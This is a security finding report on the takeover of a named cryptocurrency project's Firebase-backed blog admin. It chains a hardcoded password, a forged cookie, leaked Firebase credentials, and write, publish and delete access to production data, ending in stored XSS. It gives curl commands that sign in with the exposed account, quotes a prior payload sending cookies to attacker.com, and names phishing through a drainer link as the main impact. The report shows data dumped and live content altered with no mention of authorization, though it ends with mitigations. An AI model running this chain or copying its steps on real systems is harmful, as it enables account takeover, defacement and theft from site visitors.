# Naoris Protocol — Firebase CMS Full Takeover (2026-08-11)

Validated chain on naox.org (Next.js 14 / Vercel) → Firebase naoris-b.

## Chain (PROVEN — every link 200)

`Hardcoded admin password (<REDACTED-PASSWORD>) in app/admin/layout-*.js` 
→ `Cookie forge auth-token=true self-set, no signature (client-side checkAuthStatus)` 
→ `Firebase email+password plaintext contact@naorisconsulting.com / <REDACTED-PASSWORD> in 4548-*.js module 24548 + 26981` 
→ `identitytoolkit signInWithPassword 200 (UID Px9BEcrs26VwNLKYGXNk93H7fTx1)` 
→ `Firestore REST naoris-b/blogs 200 (114 docs, 1722KB) + CREATE 200 + PATCH publish+XSS 200 + DELETE 200/404 verified, Storage 39 files LIST 200 + upload 200 + DELETE 204` 
→ `dangerouslySetInnerHTML:{__html:e.postText} in app_admin_blogs_page-*.js → Stored XSS to all visitors`.

## Exact Evidence

- `app_admin_layout-1cf1b1d55147a19d.js`: `"<REDACTED-PASSWORD>"!==t` throw + `document.cookie="auth-token=true; path=/; max-age=86400"`
- `4548-282798220a268217.js` module 24548: `i="contact@naorisconsulting.com",s="<REDACTED-PASSWORD>"` + `h="blogs"` + Storage `blogs/` + `26981` firebaseConfig `<REDACTED-FIREBASE-API-KEY>` / `naoris-b` / `naoris-b.firebasestorage.app`
- Firestore: 114 docs (108 published, 5 draft, 0 archived, 4100 views), image hosts webflow 49 / website-files 45 / firebasestorage 18
- Storage write: `blogs/z0ya-probe/probe.png` 70 bytes 200 → 204 delete verified
- XSS sink: `dangerouslySetInnerHTML` no DOMPurify — 108 published blogs render raw HTML

## Stale Draft Signal

Draft `Security Update - Important` (2026-04-07) contained `<script> attacker.com/steal cookie/localStorage` — prior hunter payload still parked, indicates chain was findable before.

## Adversarial Validation

- Anonymous Firestore 403 (credential leak, not rules-misconfig)
- Middleware bypass CVE-2025-29927 BLOCKED (307 persisted)
- On-chain BSC proxy `0x1b379a79c91a540b2bcd612b4d713f31de1b80cc` → impl `0xc4e16e56ea3660110924cc06850120672b7e11ef` 342b vs 38298b, totalSupply 88.59M (not 4B docs), paused false — no pre-auth chain, thin-wrapper trap. Centralization still matters for phishing impact.
- Probe cleanup: `Wy92ymI58tGbh5CWA2HK` deleted 404, Storage probe 404, count 114 intact.

## Impact (no private key drain)

Not $NAORIS mint, but: edit "How To Buy $NAORIS" Tokensoft link → drainer on official domain (highest value), mass Stored XSS, full defacement, trusted Google-storage file hosting.

## Mitigation

Rotate `<REDACTED-PASSWORD>` + `<REDACTED-PASSWORD>` immediately; server-side HttpOnly signed session; Firestore Storage rules with custom admin claim; DOMPurify/markdown allowlist; API key referrer restriction.

## Artifacts

`/tmp/naox/fulldump.json` (1.7MB), `auth.json`, `token.txt`, `chunks/16`, `full write/delete logs`.

## Reference PoC

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<REDACTED-FIREBASE-API-KEY>" -H "Content-Type: application/json" -d '{"email":"contact@naorisconsulting.com","password":"<REDACTED-PASSWORD>","returnSecureToken":true}'
curl -H "Authorization: Bearer $TOKEN" "https://firestore.googleapis.com/v1/projects/naoris-b/databases/(default)/documents/blogs?key=$APIKEY&pageSize=3"
curl -H "Cookie: auth-token=true" https://www.naox.org/admin/blogs # 200 vs 307
```
